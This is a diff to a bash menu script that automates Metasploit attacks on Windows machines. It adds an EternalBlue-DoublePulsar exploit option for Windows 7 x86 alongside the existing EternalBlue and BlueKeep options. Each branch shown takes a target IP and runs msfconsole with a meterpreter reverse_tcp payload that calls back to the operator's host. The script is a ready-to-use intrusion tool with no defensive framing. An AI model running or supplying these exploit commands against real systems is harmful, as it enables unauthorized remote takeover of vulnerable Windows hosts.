@@ -22,12 +22,14 @@ n7="7"
 n8="8"
 b="bluekeep"
 e="eternalblue"
+dp="doublepulsar"
 r="RDP"
 y="Y"
 n="n"
 pack1="win7/winserver2008 x64"
 pack2="winVista/winXP/win2000/winserver2003"
 pack3="win8/win8.1/win10/winserver2012 x64"
+pack4="win7 x86"
 shell="$:"
 en="Enter"
 iface=$(ip -o -4 route show to default | awk '{print $5}')
@@ -48,8 +50,9 @@ function exp(){
 echo -e "$white[$green$n1$white] use $yellow($green$pack1$yellow:$red$e$yellow)"
 echo -e "$white[$green$n2$white] use $yellow($green$pack2$yellow:$red$e$yellow)"
 echo -e "$white[$green$n3$white] use $yellow($green$pack3$yellow:$red$e$yellow)"
-echo -e "$white[$green$n4$white] use $yellow($green$r$yellow:$blue$b$yellow)"
-echo -e "$white[$green$n5$white] Back to main menu"
+echo -e "$white[$green$n4$white] use $yellow($green$pack4$yellow:$red$dp$yellow)"
+echo -e "$white[$green$n5$white] use $yellow($green$r$yellow:$blue$b$yellow)"
+echo -e "$white[$green$n6$white] Back to main menu"
 
 }
 
@@ -179,6 +182,7 @@ echo -e "\n "
 exp
 echo -e "\n"
 read -p "$(echo -e $red$shell $nc)" ch2
+
 if [[ $ch2 == "1" ]]; then
 echo ""
 read -p "$(echo -e $white$en Target$green ip$white : $nc)" t1
@@ -187,6 +191,7 @@ set payload windows/x64/meterpreter/reverse_tcp;
 set lhost $loc_ip;
 set rhost $t1;
 exploit; "
+
 elif [[ $ch2 == "2" ]]; then
 echo ""
 read -p "$(echo -e $white$en Target$green ip$white : $nc)" t2
@@ -195,6 +200,7 @@ set payload windows/x64/meterpreter/reverse_tcp;
 set lhost $loc_ip;
 set rhost $t2;
 exploit ;"
+
 elif [[ $ch2 == "3" ]]; then
 echo ""
 read -p "$(echo -e $white$en Target$green ip$white : $nc)" t3
@@ -203,17 +209,30 @@ set payload windows/x64/meterpreter/reverse_tcp;
 set lhost $loc_ip;
 set rhost $t3;
 exploit ;"
+
 elif [[ $ch2 == "4" ]]; then
 echo ""
 read -p "$(echo -e $white$en Target$green ip$white : $nc)" t4
+msfdb reinit && echo "Waiting..." && msfconsole -q -x " use exploit/windows/smb/eternalblue_doublepulsar;
+set payload windows/meterpreter/reverse_tcp;
+set lhost $loc_ip;
+set rhost $t4;
+set processinject spoolsv.exe;
+set target 8;
+exploit	;"
+
+elif [[ $ch2 == "5" ]]; then
+echo ""
+read -p "$(echo -e $white$en Target$green ip$white : $nc)" t5
 msfdb reinit && echo "Waiting..." && msfconsole -q -x " use windows/rdp/cve_2019_0708_bluekeep_rce;
 set payload windows/x64/meterpreter/reverse_tcp;
 set lhost $loc_ip;
-set rhost $t4;
+set rhost $t5;
 set groomsize 50;
 set target 1;
 exploit	;"
-elif [[ $ch2 == "5" ]]; then
+
+elif [[ $ch2 == "6" ]]; then
 clear
 banner
 main
